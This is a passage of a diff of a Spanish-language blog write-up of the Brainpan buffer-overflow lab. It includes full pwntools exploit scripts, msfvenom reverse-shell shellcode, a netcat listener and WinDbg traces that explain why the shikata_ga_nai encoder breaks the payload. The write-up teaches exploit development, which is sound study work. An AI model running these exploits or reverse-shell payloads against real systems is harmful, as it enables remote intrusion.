-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xb6\xcc\xa2\x11\xbf\x31\x72\x13\xee\xe4</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x08\x4a\x30\x07\xdc\xe6\x79\x1f\x01\xc2\x30</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x94\xf1\xb8\xc2\x7c\xc8\x41\x68\x41\xe4\xb3</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x70\x86\xc3\x2b\x07\xfe\x37\xd1\x10\xc5\x4a</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0d\x94\xdd\xed\xc6\x0e\x39\x0f\x0a\xc8\xca</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xe7\x9e\x94\x07\xf6\x73\xaf\x3c\x73\x72</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7f\xb5\xc7\x51\x5b\x9d\x9c\xf8\xfa\x7b\x72</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x04\x1c\x24\x2b\xa0\x57\xc9\x38\xd9\x3a\x86</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\xd0\xc4\x56\x9a\x63\xb7\x64\x05\xd8\x5f</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc5\xce\xc6\x98\x2a\xe5\xbf\x36\xd5\x06\xc0</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1f\x12\x52\x90\x37\xb3\xdb\x7b\xc7\x3c\x0e</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2b\x97\x92\xe1\x8c\x47\x53\x52\x65\x8d\x5c</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\x95\xae\xb6\xa6\x3c\x55\x51\x09\x68\x31</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe8\xe1\x6b\xb9\xeb\x4a\xe2\x5f\x81\xbc\xa3</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc8\x3e\x24\xee\x82\xdf\xa9\x24\xef\xe0\x22</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xcb\x10\xae\xc2\xa6\x02\x47\x23\xfd\x78\xce</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3c\x2b\x14\x8c\xaf\xb0\xe4\xdb\xd3\x6e\xb3</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8c\x22\x67\x51\x21\x1c\xd1\x47\xb8\xf8\x1a</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc3\x67\x39\xa4\xca\xea\x05\x82\xdc\x32\x85</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8e\x88\xea\xd0\x58\x66\x4d\x8b\x2a\xd0\x07</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x60\xe5\xb4\xde\x4a\x36\xc2\xde\x86\xc0\x2a</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6e\x7f\x95\x55\x5f\x17\x11\x2e\xbd\x87\xde</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe5\x05\xb7\x94\xa7\x2c\x50\x71\x32\x6d\x3d</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x82\xe9\xb2\x38\x01\x1b\x4b\xbf\x19\x6e\x4e</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\x9d\x83\x22\x94\x4b\xa3\x91\x95\x59</span><span class="s">"</span><span class="p">
-
-payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
-payload</span><span class="o"> +=</span><span class="p"> junk
-payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x311712f3</span><span class="p">)</span><span class="c1"> # jmp esp;</span><span class="p">
-payload</span><span class="o"> +=</span><span class="p"> shellcode
-
-shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 9999</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">netcat</code> y corremos el <code class="language-plaintext highlighter-rouge">exe</code> desde una shell normal</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
-Listening on 0.0.0.0 443  </span>
-</code></pre></div></div><br>
-
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\user\Desktop> </span><span class="am">.\brainpan.exe  </span><span class="p">
-[+] initializing winsock...done.
-[+] server socket created.
-[+] bind done on port 9999
-[+] waiting for connections.</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Ejecutamos el <code class="language-plaintext highlighter-rouge">exploit</code> y el programa corrompe sin embargo <code class="language-plaintext highlighter-rouge">no</code> recibimos una shell</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
-[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
-</code></pre></div></div><br>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
-Listening on 0.0.0.0 443  </span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Si miramos ahora desde el debugger podemos ver que el <code class="language-plaintext highlighter-rouge">eip</code> apunta a una instrucción cuyo opcode es <code class="language-plaintext highlighter-rouge">0000</code>, parece que hubo un problema en alguna parte</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000></span><span class="p"> g
-(23f8.231c): Access violation - code c0000005 (first chance)
-First chance exceptions are reported before any exception handling.
-This exception may be expected and handled.
-eax=ffffffff ebx=00297000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
-eip=005ff916 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
-005ff916 0000            add     byte ptr [eax],al          ds:002b:ffffffff=??  </span>
-</code></pre></div></div><br>
-
-</section>
-
-<section class="post" id="shellcode">
-<br><h3 class="post-title">Shellcode Analisis</h3><br>
-
-<p class="plain-text">Para entender porque pasa esto establecemos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en la dirección que ejecuta <code class="language-plaintext highlighter-rouge">jmp esp</code> y enviamos nuevamente el exploit, ahora podemos desensamblar las instrucciones usando <code class="language-plaintext highlighter-rouge">u</code> y analizar cual de estas esta ocasionando el problema</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000></span><span class="p"> bp 0x311712f3
-
-</span><span class="ro">0:000> </span><span class="p">g
-Breakpoint 0 hit
-eax=ffffffff ebx=00297000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280  
-eip=311712f3 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc  
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286  
-brainpan+0x12f3:
-311712f3 ffe4            jmp     esp {005ff910}
-
-</span><span class="ro">0:000></span><span class="p"> u esp
-005ff910 dad8            fcmovu  st,st(0)
-005ff912 d97424f4        fnstenv [esp-0Ch]
-005ff916 bbf43acbbd      mov     ebx,0BDCB3AF4h
-005ff91b 5d              pop     ebp
-005ff91c 2bc9            sub     ecx,ecx
-005ff91e b152            mov     cl,52h
-005ff920 83c504          add     ebp,4
-005ff923 315d13          xor     dword ptr [ebp+13h],ebx</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">La instrucción que esta ocasionando el error es <code class="language-plaintext highlighter-rouge">fnstenv</code>, leyendo documentación podemos ver que guarda <code class="language-plaintext highlighter-rouge">28</code> bytes del estado del FPU, ¿cual es el problema? que lo esta escribindo en <code class="language-plaintext highlighter-rouge">esp - 0xc</code> o <code class="language-plaintext highlighter-rouge">esp - 12</code> por lo que escribe <code class="language-plaintext highlighter-rouge">12</code> bytes antes del stack y <code class="language-plaintext highlighter-rouge">16</code> bytes despues del stack que probablemente sobrescriben el shellcode</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">fnstenv [esp-0Ch]</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Para verlo un poco mejor veamos el contenido del <code class="language-plaintext highlighter-rouge">stack</code> antes y despues de la instrucción, ahora mismo en el stack esta almacenado el shellcode que enviamos</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000> </span><span class="p">dds esp L6
-005ff910  74d9d8da                 </span><span class="c1">(esp + 0)</span><span class="p">
-005ff914  f4bbf424                 </span><span class="c1">(esp + 4)</span><span class="p">
-005ff918  5dbdcb3a                 </span><span class="c1">(esp + 8)</span><span class="p">
-005ff91c  52b1c92b                 </span><span class="c1">(esp + 12)</span><span class="p">
-005ff920  3104c583                 </span><span class="c1">(esp + 16)</span><span class="p">
-005ff924  a903135d                 </span><span class="c1">(esp + 20)</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Al ejecutar la instrucción <code class="language-plaintext highlighter-rouge">fnstenv</code> la siguiente instrucción equivale a el hex <code class="language-plaintext highlighter-rouge">0000</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000> </span><span class="p">g 0x005ff912
-eax=ffffffff ebx=00297000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
-eip=005ff912 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
-005ff912 d97424f4        fnstenv [esp-0Ch]                  ss:002b:005ff904=41  
-
-</span><span class="ro">0:000></span><span class="p"> p
-eax=ffffffff ebx=00297000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
-eip=005ff916 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
-005ff916 0000            add     byte ptr [eax],al          ds:002b:ffffffff=??  </span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Esto pasa debido a que la instrucción sobrescribió <code class="language-plaintext highlighter-rouge">4 dwords</code> o <code class="language-plaintext highlighter-rouge">16 bytes</code> del stack</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000></span><span class="p"> dds esp L6
-005ff910  00000000                 </span><span class="c1">(esp + 0)  [overwrited]  </span><span class="p">
-005ff914  00000000                 </span><span class="c1">(esp + 4)  [overwrited]  </span><span class="p">
-005ff918  00000000                 </span><span class="c1">(esp + 8)  [overwrited]  </span><span class="p">
-005ff91c  ffff0000                 </span><span class="c1">(esp + 12) [overwrited]  </span><span class="p">
-005ff920  3104c583                 </span><span class="c1">(esp + 16)</span><span class="p">
-005ff924  a903135d                 </span><span class="c1">(esp + 20)</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">La solución mas simple es usar <code class="language-plaintext highlighter-rouge">nops</code>, antes del shellcode enviamos <code class="language-plaintext highlighter-rouge">16 nops</code> entonces al sobrescribir los <code class="language-plaintext highlighter-rouge">16 bytes</code> sobrescribira los nops y no nuestro shellcode</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32, asm
-
-offset</span><span class="o"> =</span><span class="mi"> 524</span><span class="p">
-junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
-
-shellcode</span><span class="o"> =</span><span class="no">  b</span><span class="s">""</span><span class="p">
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xda\xd8\xd9\x74\x24\xf4\xbb\xf4\x3a\xcb\xbd</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5d\x2b\xc9\xb1\x52\x83\xc5\x04\x31\x5d\x13</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xa9\x29\x29\x48\xad\xa6\x2f\xb3\x4d\x37</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x50\x3d\xa8\x06\x50\x59\xb9\x39\x60\x29\xef</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb5\x0b\x7f\x1b\x4d\x79\xa8\x2c\xe6\x34\x8e</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xf7\x65\xf2\x02\x7b\x74\x27\xe4\x42\xb7</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3a\xe5\x83\xaa\xb7\xb7\x5c\xa0\x6a\x27\xe8</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xb6\xcc\xa2\x11\xbf\x31\x72\x13\xee\xe4</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x08\x4a\x30\x07\xdc\xe6\x79\x1f\x01\xc2\x30</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x94\xf1\xb8\xc2\x7c\xc8\x41\x68\x41\xe4\xb3</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x70\x86\xc3\x2b\x07\xfe\x37\xd1\x10\xc5\x4a</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0d\x94\xdd\xed\xc6\x0e\x39\x0f\x0a\xc8\xca</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xe7\x9e\x94\x07\xf6\x73\xaf\x3c\x73\x72</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7f\xb5\xc7\x51\x5b\x9d\x9c\xf8\xfa\x7b\x72</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x04\x1c\x24\x2b\xa0\x57\xc9\x38\xd9\x3a\x86</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\xd0\xc4\x56\x9a\x63\xb7\x64\x05\xd8\x5f</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc5\xce\xc6\x98\x2a\xe5\xbf\x36\xd5\x06\xc0</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1f\x12\x52\x90\x37\xb3\xdb\x7b\xc7\x3c\x0e</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2b\x97\x92\xe1\x8c\x47\x53\x52\x65\x8d\x5c</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\x95\xae\xb6\xa6\x3c\x55\x51\x09\x68\x31</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe8\xe1\x6b\xb9\xeb\x4a\xe2\x5f\x81\xbc\xa3</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc8\x3e\x24\xee\x82\xdf\xa9\x24\xef\xe0\x22</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xcb\x10\xae\xc2\xa6\x02\x47\x23\xfd\x78\xce</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3c\x2b\x14\x8c\xaf\xb0\xe4\xdb\xd3\x6e\xb3</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8c\x22\x67\x51\x21\x1c\xd1\x47\xb8\xf8\x1a</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc3\x67\x39\xa4\xca\xea\x05\x82\xdc\x32\x85</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8e\x88\xea\xd0\x58\x66\x4d\x8b\x2a\xd0\x07</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x60\xe5\xb4\xde\x4a\x36\xc2\xde\x86\xc0\x2a</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6e\x7f\x95\x55\x5f\x17\x11\x2e\xbd\x87\xde</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe5\x05\xb7\x94\xa7\x2c\x50\x71\x32\x6d\x3d</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x82\xe9\xb2\x38\x01\x1b\x4b\xbf\x19\x6e\x4e</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\x9d\x83\x22\x94\x4b\xa3\x91\x95\x59</span><span class="s">"</span><span class="p">
-
-payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
-payload</span><span class="o"> +=</span><span class="p"> junk
-payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x311712f3</span><span class="p">)</span><span class="c1"> # jmp esp;</span><span class="p">
-payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 16</span><span class="c1"> # padding</span><span class="p">
-payload</span><span class="o"> +=</span><span class="p"> shellcode
-
-shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 9999</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Para verlo desde el debugger podemos establecer nuevamente el <code class="language-plaintext highlighter-rouge">breakpoint</code> y mirar el stack, podemos ver <code class="language-plaintext highlighter-rouge">4 dwords</code> de nops y justo despues el inicio del shellcode</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000></span><span class="p"> bp 0x311712f3
-
-</span><span class="ro">0:000></span><span class="p"> g
-Breakpoint 0 hit
-eax=ffffffff ebx=00252000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280  
-eip=311712f3 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc  
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286  
-brainpan+0x12f3:
-311712f3 ffe4            jmp     esp {005ff910}
-
-</span><span class="ro">0:000></span><span class="p"> dds esp L6
-005ff910  90909090                 </span><span class="c1">(nops)</span><span class="p">
-005ff914  90909090                 </span><span class="c1">(nops)</span><span class="p">
-005ff918  90909090                 </span><span class="c1">(nops)</span><span class="p">
-005ff91c  90909090                 </span><span class="c1">(nops)</span><span class="p">
-005ff920  74d9d8da                 </span><span class="c1">(shellcode start)</span><span class="p">
-005ff924  f4bbf424</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Después de ejecutar la instrucción <code class="language-plaintext highlighter-rouge">fnstenv</code> los <code class="language-plaintext highlighter-rouge">4 dwords</code> de nops se sobrescriben sin embargo el inicio del <code class="language-plaintext highlighter-rouge">shellcode</code> se mantiene intacto por lo que la ejecución de este no se deberia ver afectada y deberia ejecutarlo correctamente enviando la revshell</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000> </span><span class="p">g 0x005ff922
-eax=ffffffff ebx=00252000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
-eip=005ff922 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
-005ff922 d97424f4        fnstenv [esp-0Ch]                  ss:002b:005ff904=41  
-
-</span><span class="ro">0:000></span><span class="p"> p
-eax=ffffffff ebx=00252000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
-eip=005ff926 esp=005ff910 ebp=41414141 iopl=0         nv up ei ng nz na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
-005ff926 bbf43acbbd      mov     ebx,0BDCB3AF4h
-
-</span><span class="ro">0:000></span><span class="p"> dds esp L6
-005ff910  00000000                 </span><span class="c1">(overwrited)</span><span class="p">
-005ff914  00000000                 </span><span class="c1">(overwrited)</span><span class="p">
-005ff918  00000000                 </span><span class="c1">(overwrited)</span><span class="p">
-005ff91c  ffff0000                 </span><span class="c1">(overwrited)</span><span class="p">
-005ff920  74d9d8da                 </span><span class="c1">(shellcode start)</span><span class="p">
-005ff924  f4bbf424</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">El problema es ocasionado por el encoder, podemos utilizar otro tipo de <code class="language-plaintext highlighter-rouge">encoder</code> como <code class="language-plaintext highlighter-rouge">jmp_call_additive</code> que no tendrá instrucciones que alteren el <code class="language-plaintext highlighter-rouge">esp</code> como si las tiene el encoder <code class="language-plaintext highlighter-rouge">shikata_ga_nai</code> que es el que msfvenom se usa por <code class="language-plaintext highlighter-rouge">defecto</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">✘</span><span class="p"> -e x86/shikata_ga_nai
-</span><span class="ve">✔</span><span class="p"> -e x86/jmp_call_additive  </span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Asi que creamos un nuevo <code class="language-plaintext highlighter-rouge">shellcode</code> ahora con el encoder <code class="language-plaintext highlighter-rouge">x86/jmp_call_additive</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
@@ -936,7 +484,7 @@ shellcode += b"\x65\xb9\x03\x4a\x89\x6e\x23\x5f\x89\x90\xdb"
 shellcode += b"\x60"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">De esta forma no usamos nops para evitar el problema y el exploit queda mas simple</p>
+<p class="plain-text">Nuestro exploit final llena con <code class="language-plaintext highlighter-rouge">524 A's</code> el espacio que existe antes de sobrescribir el return address que se sobrescribe con un gadget que ejecuta un <code class="language-plaintext highlighter-rouge">jmp esp</code> y al estar el shellcode que creamos en el stack cuando salta nos envía una revshell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
@@ -945,38 +493,38 @@ offset</span><span class="o"> =</span><span class="mi"> 524</span><span class="p
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
 shellcode</span><span class="o"> =</span><span class="no">  b</span><span class="s">""</span><span class="p">
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x37\xc9\x1e\xb2\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\xcb\x21\x9c\xb2\x33\xb2\xc1\x3b</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd6\x83\xc1\x58\x93\xb4\xf1\x2b\xf1\x38\x79</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x79\xe1\xcb\x0f\x56\x06\x7b\xa5\x80\x29\x7c</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x96\xf1\x28\xfe\xe5\x25\x8a\x3f\x26\x38\xcb</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x78\x5b\xb1\x99\xd1\x17\x64\x0d\x55\x6d\xb5</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa6\x25\x63\xbd\x5b\xfd\x82\xec\xca\x75\xdd</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2e\xed\x5a\x55\x67\xf5\xbf\x50\x31\x8e\x74</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2e\xc0\x46\x45\xcf\x6f\xa7\x69\x22\x71\xe0</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4e\xdd\x04\x18\xad\x60\x1f\xdf\xcf\xbe\xaa</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\x68\x34\x0c\x27\x88\x99\xcb\xac\x86\x56</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x9f\xea\x8a\x69\x4c\x81\xb7\xe2\x73\x45\x3e</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb0\x57\x41\x1a\x62\xf9\xd0\xc6\xc5\x06\x02</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa9\xba\xa2\x49\x44\xae\xde\x10\x01\x03\xd3</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xaa\xd1\x0b\x64\xd9\xe3\x94\xde\x75\x48\x5c</span><span class="s">"</span><span class="p">  
